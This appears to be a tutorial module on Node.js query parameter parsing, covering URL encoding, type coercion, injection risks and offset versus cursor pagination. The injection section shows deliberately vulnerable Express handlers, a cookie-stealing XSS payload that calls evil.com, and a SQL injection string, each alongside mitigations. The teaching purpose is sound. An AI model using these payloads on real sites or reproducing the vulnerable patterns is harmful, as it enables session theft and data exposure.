# M09: Query Param Parser — Deep Concepts

## URL Encoding & Decoding

URLs are limited to ASCII characters. Special characters and spaces must be percent-encoded.

```
Original:  hello world & foo=bar?
Encoded:   hello%20world%20%26%20foo%3Dbar%3F
```

**WHAT:** Percent-encoding replaces unsafe characters with `%` followed by two hexadecimal digits.

**WHY:** HTTP request lines and URLs cannot contain raw spaces or certain symbols.

**HOW in Node.js:**
```javascript
const encoded = encodeURIComponent('hello world'); // "hello%20world"
const decoded = decodeURIComponent('hello%20world'); // "hello world"
```

**WRONG:** Manually replacing spaces with `+` without handling other special characters.
**RIGHT:** Always use `encodeURIComponent` / `decodeURIComponent` or `URLSearchParams`.

## Query String Parsing

A query string is a sequence of key-value pairs separated by `&`.

```
?foo=1&foo=2&bar=true&baz=
```

**Duplicate keys:** Some frameworks collapse duplicates (`foo: "2"`), others create arrays (`foo: ["1", "2"]`). Express uses the **qs** library and creates arrays by default when duplicates exist.

**Empty values:** `baz=` results in an empty string `""`, not `null` or `undefined`.

**Missing values:** `?flag` (no `=`) results in `undefined` in Express but `"true"` in some parsers.

## Type Coercion in JavaScript

JavaScript is dynamically typed and performs implicit coercion in many operations.

### Coercion Rules Table

| Expression | Result | Rule |
|------------|--------|------|
| `"1" + 1` | `"11"` | If either operand is string, convert the other to string and concatenate |
| `"2" * "3"` | `6` | If both can be converted to numbers, multiply |
| `"5" - 3` | `2` | Subtraction always attempts numeric conversion |
| `true + 1` | `2` | Boolean converts to number: `true` -> `1`, `false` -> `0` |
| `false + 1` | `1` | `false` -> `0` |
| `null + 1` | `1` | `null` -> `0` |
| `undefined + 1` | `NaN` | `undefined` -> `NaN` |
| `"" + 0` | `"0"` | Empty string + number -> string |
| `[] + []` | `""` | Array converts to string (join by comma), empty array -> `""` |
| `[] + {}` | `"[object Object]"` | Object converts to string via `toString()` |
| `{} + []` | `0` or `"[object Object]"` | Context-dependent (statement vs expression) |

**WHY this matters:** `req.query.limit` is a string. `const offset = req.query.page * req.query.limit` accidentally works, but `const nextPage = req.query.page + 1` produces `"21"` instead of `3`.

**RIGHT:** Use explicit coercion:
```javascript
const page = Number(req.query.page); // NaN if invalid
const limit = parseInt(req.query.limit, 10); // safer for integers
```
Or better, use a schema library that handles this.

## Injection Attacks via Query Parameters

### XSS (Cross-Site Scripting)

If a query parameter is rendered in HTML without escaping:

```javascript
// Attacker visits: /search?q=<script>fetch('https://evil.com?cookie='+document.cookie)</script>
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`); // VULNERABLE
});
```

**Payload:**
```html
<script>alert('XSS')</script>
```

**Mitigation:**
1. Validate and sanitize input at the parser boundary.
2. Escape output in templates (`<%= query %>` in EJS escapes by default, but `${query}` in template literals does not).
3. Use Content Security Policy (CSP) headers.

### SQL Injection

```javascript
// Attacker visits: /users?role=admin' OR '1'='1
app.get('/users', (req, res) => {
  db.query(`SELECT * FROM users WHERE role = '${req.query.role}'`); // VULNERABLE
});
```

**Mitigation:**
- Never interpolate user input into SQL strings.
- Use parameterized queries: `db.query('SELECT * FROM users WHERE role = ?', [req.query.role])`.

## Pagination: Offset vs Cursor

### Offset Pagination

**Concept:** Skip `N` rows, then take `M` rows.

```sql
SELECT * FROM users ORDER BY id LIMIT 20 OFFSET 40;
```

**Pros:**
- Easy to jump to any page.
- Simple mental model.

**Cons:**
- Performance degrades as offset grows (database must scan and discard all offset rows).
- Data drift: if a row is inserted/deleted while paginating, items shift and may be duplicated or skipped.

### Cursor Pagination

**Concept:** Use a pointer (cursor) to the last seen item. The next page starts after that item.

```sql
SELECT * FROM users 
WHERE (created_at, id) > ('2024-01-01 10:00:00', 100)
ORDER BY created_at, id 
LIMIT 20;
```

**Pros:**
- O(log n) performance with a composite index.
- No data drift---new insertions don't affect existing cursors.

**Cons:**
- Cannot jump to arbitrary pages (no "Page 50" without iterating).
- Requires a stable sort order and unique cursor column.

**WRONG:** Using offset pagination for a Twitter-like feed.
**RIGHT:** Using cursor pagination for feeds, offset pagination for admin dashboards.

## Sources
- MDN encodeURIComponent: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent
- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- Use The Index, Luke (Pagination): https://use-the-index-luke.com/sql/partial-results/fetch-next-page
